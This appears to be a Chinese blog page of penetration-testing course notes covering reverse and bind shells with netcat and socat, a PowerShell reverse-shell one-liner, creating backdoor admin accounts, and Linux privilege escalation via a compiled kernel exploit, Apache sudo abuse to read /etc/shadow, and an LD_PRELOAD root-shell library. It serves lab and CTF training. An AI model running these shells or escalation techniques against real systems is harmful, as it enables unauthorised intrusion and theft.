<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>在我们的 netcat 监听器前面加上“rlwrap”给我们一个功能更齐全的 shell。这种技术在处理 Windows shell  时特别有用，否则众所周知，Windows shell 很难稳定。在处理 Linux  目标时，可以通过使用与先前技术的第三步中相同的技巧来完全稳定：使用 Ctrl + Z 将 shell 设置为后台，然后使用<code>stty raw -echo; fg</code>稳定并重新进入 shell。</p>
<h4 id="Task4-socat"><a href="#Task4-socat" class="headerlink" title="Task4 socat"></a>Task4 socat</h4><p>Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。考虑 socat 的最简单方法是将其视为两点之间的连接器。为了这个房间的利益，这本质上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。</p>
<p> <em>反向贝壳</em></p>
<p>如前所述，socat 的语法比 netcat 的语法困难得多。以下是 socat 中基本反向 shell 侦听器的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; -</span><br></pre></td></tr></table></figure>

<p>与 socat 一样，这需要两个点（监听端口和标准输入）并将它们连接在一起。生成的 shell 不稳定，但这可以在Linux或 Windows 上运行，相当于<code>nc -lvnp &lt;port&gt;</code> 。</p>
<p>在 Windows 上，我们将使用此命令来连接回来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>

<p>“pipes”选项用于强制powershell（或cmd.exe）使用Unix风格的标准输入和输出。</p>
<p>这是Linux目标的等效命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>

<p> <em>绑定外壳</em></p>
<p>在Linux目标上，我们将使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</span><br></pre></td></tr></table></figure>

<p>在 Windows 目标上，我们将使用以下命令作为侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</span><br></pre></td></tr></table></figure>

<p>我们使用“pipes”参数在CLI环境中处理输入和输出的 Unix 和 Windows 方式之间建立接口。</p>
<p>无论目标是什么，我们都会在攻击机器上使用此命令来连接到等待的侦听器。</p>
<p><code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></p>
<p>现在让我们看看 Socat 更强大的用途之一：完全稳定的Linux tty 反向 shell。这仅在目标是Linux时才有效，但<em>明显</em>更稳定。如前所述，socat 是一个非常通用的工具；然而，以下技术可能是其最有用的应用之一。这是新的侦听器语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</span><br></pre></td></tr></table></figure>

<p>让我们将该命令分为两部分。像往常一样，我们将两个点连接在一起。在本例中，这些点是侦听端口和文件。具体来说，我们将当前 TTY 作为文件传递，并将回显设置为零。这大约相当于<strong>使用 Ctrl + Z, <code>stty raw -echo; fg</code>使用 netcat shell 进行<code>stty raw -echo; fg</code>技巧</strong> —— 额外的好处是立即稳定并连接到完整的 tty。</p>
<p>第一个侦听器可以与任何有效负载连接；但是，必须使用非常特定的 socat 命令激活此特殊侦听器。这意味着目标必须安装 socat。大多数机器默认情况下没有安装 socat，但是，可以上传<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">预编译的 socat 二进制文件</a>，然后可以正常执行。</p>
<p>特殊命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure>

<p>这是少数，所以让我们把它分解一下。</p>
<p>第一部分很简单——我们正在与在我们自己的机器上运行的侦听器连接。该命令的第二部分使用<code>EXEC:&quot;bash -li&quot;</code>创建交互式 bash 会话。我们还传递参数：pty、stderr、sigint、setsid 和 sane：</p>
<ul>
<li><strong>pty</strong> ，在目标上分配一个伪终端——稳定过程的一部分</li>
<li><strong>stderr</strong> ，确保任何错误消息都显示在 shell 中（通常是非交互式 shell 的问题）</li>
<li><strong>sigint</strong> ，将任何 Ctrl + C 命令传递到子进程中，允许我们终止 shell 内的命令</li>
<li><strong>setid</strong> ，在新会话中创建进程</li>
<li><strong>sane</strong> ，稳定终端，尝试使其“正常化”。</li>
</ul>
<p>需要考虑的内容有很多，所以让我们看看它的实际效果。</p>
<p>与往常一样，左边我们有一个在本地攻击机器上运行的侦听器，右边我们有一个受感染目标的模拟，使用非交互式 shell 运行。使用非交互式 netcat shell，我们执行特殊的 socat 命令，并在左侧的 socat 侦听器上收到完全交互式的  bash shell：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917171620618.png"></p>
<p>请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如SSH 。然后可以通过设置 stty 值（如上一个任务中所示）来进一步改进，这将使我们可以使用 Vim 或 Nano 等文本编辑器。</p>
<h4 id="Task5-socat-加密shell"><a href="#Task5-socat-加密shell" class="headerlink" title="Task5 socat 加密shell"></a>Task5 socat 加密shell</h4><p>socat 的众多优点之一是它能够创建加密的 shell——绑定和反向。我们为什么要这样做？除非您拥有解密密钥，否则加密的 shell 无法被监视，并且通常能够绕过IDS 。</p>
<p>我们在上一个任务中介绍了如何创建基本 shell，因此这里不再介绍语法。可以说，任何时候<code>TCP</code>用作命令的一部分，在使用加密 shell 时都应该将其替换为<code>OPENSSL</code> 。我们将在任务结束时介绍一些示例，但首先让我们讨论一下证书。</p>
<p>我们首先需要生成一个证书才能使用加密的 shell。这在我们的攻击机器上最容易做到：          </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</span><br></pre></td></tr></table></figure>

<p>此命令创建一个带有匹配证书文件的 2048 位 RSA 密钥，该密钥是自签名的，并且有效期不到一年。当您运行此命令时，它会要求您填写有关证书的信息。这可以留空，也可以随机填写。</p>
<p>然后我们需要将两个创建的文件合并为一个<code>.pem</code>文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat shell.key shell.crt &gt; shell.pem</span><br></pre></td></tr></table></figure>

<p>现在，当我们设置反向 shell 侦听器时，我们使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</span><br></pre></td></tr></table></figure>

<p>这将使用我们生成的证书设置一个 OPENSSL 侦听器。 <code>verify=0</code>告诉连接不必尝试验证我们的证书是否已由公认的机构正确签名。请注意，证书<em>必须</em>在正在侦听的任何设备上使用。</p>
<p>要连接回来，我们将使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</span><br></pre></td></tr></table></figure>

<p>同样的技术也适用于绑定 shell：</p>
<p> 目标：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</span><br></pre></td></tr></table></figure>

<p> 攻击者：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</span><br></pre></td></tr></table></figure>

<p>再次注意，即使对于 Windows 目标，证书也必须与侦听器一起使用，因此需要复制 PEM 文件以用于绑定 shell。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172127646.png"></p>
<h4 id="Task6-常见shell-payload"><a href="#Task6-常见shell-payload" class="headerlink" title="Task6 常见shell payload"></a>Task6 常见shell payload</h4><p>之前的任务提到我们将研究一些使用 netcat 作为 Bindshell 侦听器的方法，因此我们将从这里开始。在某些版本的 netcat 中（包括 Kali 附带的<code>nc.exe</code> Windows 版本，位于 <code>/usr/share/windows-resources/binaries</code> ，以及 Kali 本身使用的版本： <code>netcat-traditional</code> ）有一个<code>-e</code>选项，允许您在连接上执行进程。例如，作为听众：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;PORT&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>使用 netcat 连接到上述侦听器将导致目标上有一个绑定 shell。</p>
<p>同样，对于反向 shell，连接回 <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> 会导致目标受到反向炮弹攻击。</p>
<p>然而，大多数版本的 netcat 中均未包含此功能，因为人们普遍认为它非常不安全（这很有趣，不是吗？）。在几乎总是需要静态二进制文件的 Windows 上，这种技术将完美地发挥作用。然而，在Linux上，我们将使用以下代码为绑定 shell 创建侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em>该命令首先在<code>/tmp/f</code>处创建一个<a href="https://www.linuxjournal.com/article/2156">命名管道</a>。然后它启动一个 netcat 侦听器，并将侦听器的输入连接到命名管道的输出。然后，netcat 侦听器的输出（即我们发送的命令）直接通过管道传输到<code>sh</code>中，将 stderr 输出流发送到 stdout 中，并将 stdout 本身发送到命名管道的输入中，从而完成循环。</em></p>
</blockquote>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172841950.png"></p>
<p>可以使用非常相似的命令发送 netcat 反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>

<p>除了使用 netcat connect 语法（而不是 netcat Listen 语法）之外，此命令实际上与前一个命令相同。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172945229.png"></p>
<p>当针对现代 Windows Server 时，需要 Powershell 反向 shell 是很常见的，因此我们将在这里介绍标准的单行 PSH 反向 shell。</p>
<p>该命令非常复杂，为了简单起见，这里不再直接解释。然而，这是一本非常有用的单行文字，值得随身携带：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;**&lt;ip&gt;**&#x27;,**&lt;port&gt;**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i =  $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object  -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; +  (pwd).Path + &#x27;&gt; &#x27;;$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>

<p>为了使用它，我们需要用适当的 IP 和端口选择替换“<IP>”和“<port>”。然后可以将其复制到 cmd.exe shell（或在  Windows 服务器上执行命令的另一种方法，例如 webshell）中并执行，从而生成反向 shell</port></IP></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917173238329.png"></p>
<h4 id="Task7-拿到shell下一步"><a href="#Task7-拿到shell下一步" class="headerlink" title="Task7 拿到shell下一步"></a>Task7 拿到shell下一步</h4><p>我们已经介绍了许多生成、发送和接收 shell 的方法。这些的共同点是它们往往不稳定且非交互式。即使是更容易稳定的 Unix 风格的 shell 也不是理想的。那么，对此我们能做些什么呢？</p>
<p>理想情况下，在Linux上，我们会寻找机会访问用户帐户。存储在<code>/home/&lt;user&gt;/.ssh</code>中的SSH密钥通常是实现此目的的理想方法。在 CTF 中，在盒子上的某个地方发现凭证的情况也并不少见。有些漏洞还允许您添加自己的帐户。特别是像<a href="https://dirtycow.ninja/">Dirty C0w</a>或可写的 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd 这样的东西会很快让你通过SSH访问机器，假设SSH是开放的。</p>
<p>在 Windows 上选项通常更加有限。有时可以在注册表中找到正在运行的服务的密码。例如，VNC 服务器经常将密码以明文形式存储在注册表中。某些版本的 FileZilla FTP 服务器还会将凭据保留在XML文件中： <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code> 或者 <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code> 。这些可以是MD5哈希值或纯文本形式，具体取决于版本。</p>
<p>理想情况下，在 Windows 上，您将获得以 SYSTEM 用户身份运行的 shell，或者以高权限运行的管理员帐户。在这种情况下，可以简单地将您自己的帐户（在管理员组中）添加到计算机，然后通过RDP 、 telnet 、 winexe 、 psexec 、 WinRM 或任意数量的其他方法登录，具体取决于机器上运行的服务。</p>
<p>其语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line">net localgroup administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure>

<h3 id="Linux-权限提升"><a href="#Linux-权限提升" class="headerlink" title="Linux 权限提升"></a>Linux 权限提升</h3><h4 id="Task1-信息搜集"><a href="#Task1-信息搜集" class="headerlink" title="Task1 信息搜集"></a>Task1 信息搜集</h4><h5 id="hostname"><a href="#hostname" class="headerlink" title="hostname"></a>hostname</h5><p><code>hostname</code>命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息（例如用于生产SQL服务器的SQL -PROD-01） 。</p>
<h5 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h5><p>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞时非常有用。</p>
<h5 id="proc-version"><a href="#proc-version" class="headerlink" title="&#x2F;proc&#x2F;version"></a>&#x2F;proc&#x2F;version</h5><p>proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的武器库中必不可少的工具。</p>
<p>Looking at <code>/proc/version</code>看着 <code>/proc/version</code> 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。</p>
<h5 id="etc-issue"><a href="#etc-issue" class="headerlink" title="&#x2F;etc&#x2F;issue"></a>&#x2F;etc&#x2F;issue</h5><p>还可以通过查看<code>/etc/issue</code>文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。</p>
<h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><p><code>ps</code>命令是查看Linux系统上正在运行的进程的有效方法。在终端上输入<code>ps</code>将显示当前 shell 的进程。</p>
<p><code>ps</code> （进程状态）的输出将显示以下内容；</p>
<ul>
<li>PID ：进程ID（进程唯一）</li>
<li>TTY：用户使用的终端类型</li>
<li>时间：进程使用的CPU时间量（这不是该进程运行的时间）</li>
<li>CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）</li>
</ul>
<p>“ps”命令提供了一些有用的选项。</p>
<ul>
<li><p><code>ps -A</code> ：查看所有正在运行的进程</p>
</li>
<li><p><code>ps axjf</code> ：查看进程树（在下面运行<code>ps axjf</code>之前查看树的形成）</p>
</li>
<li><p><code>ps aux</code> ： <code>aux</code>选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞。</p>
</li>
</ul>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><p><code>env</code>命令将显示环境变量。</p>
<p>PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。</p>
<h5 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h5><p>读取<code>/etc/passwd</code>文件是发现系统上用户的简单方法。虽然输出可能很长并且有点令人生畏，但它可以轻松地被剪切并转换为用于暴力攻击的有用列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>

<p>请记住，这将返回所有用户，其中一些是不是很有用的系统或服务用户。另一种方法可能是 grep 查找“home”，因为真正的用户很可能将其文件夹放在“home”目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep home</span><br></pre></td></tr></table></figure>

<h5 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h5><p>目标系统可能是另一个网络的枢纽点。 <code>ifconfig</code>命令将为我们提供有关系统网络接口的信息。下面的示例显示目标系统具有三个接口（eth0、tun0 和 tun1）。我们的攻击机器可以到达 eth0 接口，但无法直接访问其他两个网络。</p>
<p>可以使用<code>ip route</code>命令查看存在哪些网络路由来确认这一点</p>
<h5 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h5><p>在对现有接口和网络路由进行初步检查后，值得研究现有通信。 <code>netstat</code>命令可以与多个不同的选项一起使用来收集有关现有连接的信息。</p>
<ul>
<li><code>netstat -a</code> ：显示所有监听端口和已建立的连接。</li>
<li><code>netstat -at</code>或<code>netstat -au</code>还可用于分别列出 TCP 或UDP协议。</li>
<li><code>netstat -l</code> ：列出“监听”模式下的端口。这些端口已打开并准备好接受传入连接。这可以与“t”选项一起使用，以仅列出使用TCP协议侦听的端口（如下）</li>
<li><code>netstat -s</code> ：按协议列出网络使用统计信息（如下） 这也可以与<code>-t</code>或<code>-u</code>选项一起使用，以将输出限制为特定协议。</li>
<li><code>netstat -tp</code> ：列出连接以及服务名称和PID信息，这也可以与<code>-l</code>选项一起使用来列出侦听端口</li>
</ul>
<h5 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h5><p>在目标系统中搜索重要信息和潜在的权限升级向量可能会取得丰硕成果。内置的“查找”命令非常有用，值得保留在您的武器库中。</p>
<p>以下是“查找”命令的一些有用示例。</p>
<p> <strong>查找文件：</strong></p>
<ul>
<li><code>find . -name flag1.txt</code> ：在当前目录中查找名为“flag1.txt”的文件</li>
<li><code>find /home -name flag1.txt</code> ：在 &#x2F;home 目录中查找文件名“flag1.txt”</li>
<li><code>find / -type d -name config</code> ：查找“&#x2F;”下名为config的目录</li>
<li><code>find / -type f -perm 0777</code> ：查找具有777权限的文件（所有用户可读、可写、可执行的文件）</li>
<li><code>find / -perm a=x</code> : 查找可执行文件</li>
<li><code>find /home -user frank</code> ：查找“&#x2F;home”下用户“frank”的所有文件</li>
<li><code>find / -mtime 10</code> ：查找最近 10 天内修改过的文件</li>
<li><code>find / -atime 10</code> ：查找过去 10 天内访问过的文件</li>
<li><code>find / -cmin -60</code> ：查找过去一小时（60 分钟）内更改的文件</li>
<li><code>find / -amin -60</code> ：查找最近一小时（60 分钟）内访问的文件</li>
<li><code>find / -size 50M</code> ：查找大小为 50 MB 的文件</li>
</ul>
<p>该命令还可以与（+）和（-）符号一起使用来指定大于或小于给定大小的文件。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917180757471.png"></p>
<p>上面的示例返回大于 100 MB 的文件。值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用带有<code>-type f 2&gt;/dev/null</code>的find命令将错误重定向到“&#x2F;dev&#x2F;null”并获得更清晰的输出</p>
<p>可以写入或执行的文件夹和文件：</p>
<ul>
<li><code>find / -writable -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -222 -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -o w -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -o x -type d 2&gt;/dev/null</code> ：查找全局可执行文件夹</li>
<li>查找开发工具和支持的语言：<ul>
<li><code>find / -name perl*</code></li>
<li><code>find / -name python*</code></li>
<li><code>find / -name gcc*</code></li>
</ul>
</li>
</ul>
<p>查找特定文件权限：</p>
<p>下面是一个简短的示例，用于查找设置了 SUID 位的文件。 SUID 位允许文件以拥有该文件的帐户（而不是运行该文件的帐户）的权限级别运行。这允许一个有趣的权限升级路径，我们将在任务 6 中看到更多细节。下面的示例用于完成“find”命令的主题。</p>
<ul>
<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code> ：查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。</li>
</ul>
<h4 id="Task2-自动化枚举工具"><a href="#Task2-自动化枚举工具" class="headerlink" title="Task2 自动化枚举工具"></a>Task2 自动化枚举工具</h4><p>有几种工具可以帮助您在枚举过程中节省时间。这些工具只能用于节省时间，因为它们可能会错过一些权限升级向量。下面是流行的Linux枚举工具的列表，以及各自的 Github 存储库的链接。</p>
<p>目标系统的环境将影响您将能够使用的工具。例如，如果目标系统上未安装用 Python 编写的工具，您将无法运行该工具。这就是为什么熟悉几个工具比拥有一个首选工具更好。</p>
<ul>
<li><strong>LinPeas</strong> ： <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li>
<li><strong>LinEnum</strong>：<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li><strong>LES（ Linux漏洞利用建议器）：</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
<li><strong>Linux智能枚举：</strong> <a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li><strong>Linux隐私检查器：</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li>
</ul>
<h4 id="Task3-内核漏洞"><a href="#Task3-内核漏洞" class="headerlink" title="Task3 内核漏洞"></a>Task3 内核漏洞</h4><p>理想情况下，权限升级会导致 root 权限。有时可以简单地通过利用现有漏洞来实现，或者在某些情况下通过访问具有更多权限、信息或访问权限的另一个用户帐户来实现。除非单个漏洞导致 root shell，否则权限提升过程将依赖于错误配置和宽松的权限。Linux系统上的内核管理系统内存和应用程序等组件之间的通信。这个关键功能需要内核有特定的权限；因此，成功利用该漏洞可能会导致 root 权限。</p>
<p>内核利用方法很简单；</p>
<ol>
<li>识别内核版本</li>
<li>搜索并找到目标系统内核版本的漏洞利用代码</li>
<li>运行漏洞利用程序</li>
</ol>
<p>虽然看起来很简单，但请记住，失败的内核漏洞可能会导致系统崩溃。在尝试内核漏洞之前，请确保这种潜在结果在渗透测试范围内是可以接受的。</p>
<p> <strong>研究来源：</strong></p>
<ol>
<li>根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。</li>
<li><a href="https://www.linuxkernelcves.com/cves%E7%AD%89%E6%9D%A5%E6%BA%90%E4%B9%9F%E5%BE%88%E6%9C%89%E7%94%A8%E3%80%82">https://www.linuxkernelcves.com/cves等来源也很有用。</a></li>
<li>另一种选择是使用像 LES（ Linux Exploit Suggester）这样的脚本，但请记住，这些工具可能会生成误报（报告不影响目标系统的内核漏洞）或漏报（不报告任何内核漏洞，尽管内核是易受伤害的）。</li>
</ol>
<p> <strong>提示&#x2F;注释：</strong></p>
<ol>
<li>在 Google、Exploit-db 或 searchsploit 上搜索漏洞时对内核版本过于具体</li>
<li>在启动漏洞利用代码之前，请确保您了解其工作原理。某些漏洞利用代码可以对操作系统进行更改，从而使它们在进一步使用时不安全，或者对系统进行不可逆转的更改，从而在以后产生问题。当然，这些在实验室或 CTF 环境中可能不是大问题，但在真正的渗透测试过程中，这些绝对是禁忌。</li>
<li>某些漏洞一旦运行可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。</li>
<li>您可以分别使用<code>SimpleHTTPServer</code> Python 模块和<code>wget</code>将漏洞利用代码从您的计算机传输到目标系统。</li>
</ol>
<p>打开靶机，通过ssh进行连接，执行以下命令观察内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>得到版本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>经过搜索存在符合版本的漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143412176.png"></p>
<p>我们通过searchsploit下载exp代码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143500996.png"></p>
<p>然后在本地编译并保存为exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></table></figure>

<p>本机开启http服务后，在连接的靶机的<code>/tmp</code>目录下使用wget下载下来</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143637308.png"></p>
<p>赋予777执行权限，成功提权</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143731023.png"></p>
<h4 id="Task4-Sudo"><a href="#Task4-Sudo" class="headerlink" title="Task4 Sudo"></a>Task4 Sudo</h4><p>默认情况下，sudo 命令允许您以 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一定的权限灵活性。例如，初级SOC分析师可能需要定期使用Nmap ，但不会获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行Nmap ，同时在系统的其余部分保持其常规权限级别。</p>
<p>任何用户都可以使用<code>sudo -l</code>命令检查其与 root 权限相关的当前情况。</p>
<p><a href="https://gtfobins.github.io/%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%AE%83%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%82%A8%E5%8F%AF%E8%83%BD%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/是一个有价值的资源，它提供了有关如何使用您可能拥有</a> sudo 权限的任何程序的信息。</p>
<p><strong>利用应用程序功能</strong></p>
<p>某些应用程序在此上下文中不会有已知的漏洞。您可能会看到的这样的应用程序是 Apache2 服务器。</p>
<p>在这种情况下，我们可以使用“黑客”来利用应用程序的功能来泄露信息。如下所示，Apache2 有一个选项支持加载备用配置文件（ <code>-f</code> ：指定备用 ServerConfigFile）。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928144751183.png"></p>
<p>使用此选项加载<code>/etc/shadow</code>文件将导致一条错误消息，其中包含<code>/etc/shadow</code>文件的第一行。</p>
<p><strong>利用LD_PRELOAD</strong></p>
<p>在某些系统上，您可能会看到 LD_PRELOAD 环境选项。</p>
<p>LD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">博文</a>将让您了解 LD_PRELOAD 的功能。如果启用“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略。</p>
<p>这个特权升级向量的步骤可以总结如下：</p>
<ol>
<li>检查 LD_PRELOAD（使用 env_keep 选项）</li>
<li>编写一个简单的 C 代码编译为共享对象（.so 扩展名）文件</li>
<li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li>
</ol>
<p>C 代码将简单地生成一个 root shell，可以编写如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以将此代码保存为 shell.c，并使用 gcc 使用以下参数将其编译为共享对象文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure>

